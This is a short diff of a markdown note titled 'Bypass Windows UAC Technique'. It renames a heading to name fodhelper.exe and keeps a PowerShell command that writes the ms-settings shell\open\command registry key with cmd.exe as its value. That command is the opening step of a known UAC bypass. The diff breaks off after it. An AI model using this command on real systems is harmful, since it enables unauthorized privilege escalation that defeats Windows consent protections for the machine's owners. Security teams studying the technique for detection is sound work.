@@ -1,6 +1,6 @@
 # Bypass Windows UAC Technique
 
-## Bypass UAC with 3 Commands
+## Bypass UAC with Using fodhelper.exe
 ```
 #spawn cmd.exe process 
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "cmd.exe" -Force
